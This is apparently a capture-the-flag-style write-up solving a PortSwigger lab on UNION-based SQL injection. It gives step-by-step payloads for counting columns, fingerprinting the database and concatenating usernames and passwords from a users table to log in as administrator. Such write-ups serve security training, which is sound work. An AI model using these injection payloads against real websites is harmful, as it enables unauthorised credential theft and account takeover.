## Lab Description :

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/30248f0f83c1a5d0c71ba4d9f30891ce18829b55/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20retrieving%20multiple%20values%20in%20a%20single%20column/Images/Lab%20Description.png)

## Solution :

**String concatenation**

You can concatenate together multiple strings to make a single string.

|    Name    	| Command                                               	|
|:----------:	|-------------------------------------------------------	|
|  MICROSOFT 	| 'foo'+'bar'                                           	|
| POSTgreSQL 	| 'foo'\|\|'bar'                                        	|
| MYSQL      	| 'foo' 'bar' [Note the space between the two strings]  	|
|            	| CONCAT('foo','bar')                                   	|
| ORACLE     	| 'foo'\| \|'bar'                                       	|

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/f456c072d7b1a43a0ab85e457ce9de33c8e180a6/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20retrieving%20multiple%20values%20in%20a%20single%20column/Images/Pets%20Category.png)


Query made - 

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>'
```

#### Determine the number of columns -

**ORDER BY 3** returns an error, which means there are 2 columns that is retreived by the web app from the db.


```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ORDER BY 3 --
```

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/e3d496c485c84f9802916e0b8a4a4209e907bb69/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20retrieving%20multiple%20values%20in%20a%20single%20column/Images/Internal%20Error%20-%20Number%20of%20Columns.png)

#### Determine which columns contain text data -

**1st column**

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT 'A',NULL --
```

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/28413368434043735559488c1297a2a73a37a39b/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20retrieving%20multiple%20values%20in%20a%20single%20column/Images/Payload%20in%201st%20NULL.png)

**2nd Column**

This column contains text data 

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,'A' --
```

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/33246ef2e9bd41e325645c912596d07877c86c15/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20retrieving%20multiple%20values%20in%20a%20single%20column/Images/Payload%20in%202nd%20NULL.png)


#### Determine the type of database -

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/8a903c6448233c0a2f047efa9c9706bd33a0e99c/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20retrieving%20multiple%20values%20in%20a%20single%20column/Images/Database%20Types%20and%20Versions.png)

Since we know 2nd column is containing text data, we can try to use version command of each database system to identify the type of database present in the backend.

**ORACLE**

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,banner FROM v$version --
```

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/219f6827c29d56bbf3f0d90bd1e2aa8aa17a4e00/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20retrieving%20multiple%20values%20in%20a%20single%20column/Images/Internal%20Server%20Error%20-%20Oracle%20Database.png)

500 - SERVER ERROR

**Microsoft**


```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,@@version --
```

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/1fcb2d4ddbfea97d83037c96c834336c0b1da632/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20retrieving%20multiple%20values%20in%20a%20single%20column/Images/Internal%20Server%20Error%20-%20Microsoft%20Database.png)

500 - Server Error

> NOTE - Syntax for findng version is the same for both Microsoft and MYSQL

**PostgreSQL**

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,version() --
```

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/90beb6f4e3f3e89929c8bdbb57fe38a76480caca/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20retrieving%20multiple%20values%20in%20a%20single%20column/Images/PostgreSQL%20Database%20Confirmed.png)

We can confirm that this is an POSTgreSQL db in backend.

#### Retreive multiple values in single column -

For POSTgreSQL , the syntax for string concatination is `'foo'||'bar'`

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,username||'-'||password FROM users --
```

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/df5a157ce35ffe8389ddb8b00decbd1513a19c71/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20retrieving%20multiple%20values%20in%20a%20single%20column/Images/Retrieve%20Multiple%20values%20from%20Single%20Column.png)

We got all the usernames & passwords,

![image]()

Now we can login as administrator

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/cfe565b5cef18900f51c93838943a5c61177eb25/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20retrieving%20multiple%20values%20in%20a%20single%20column/Images/Lab%20Solution.png)







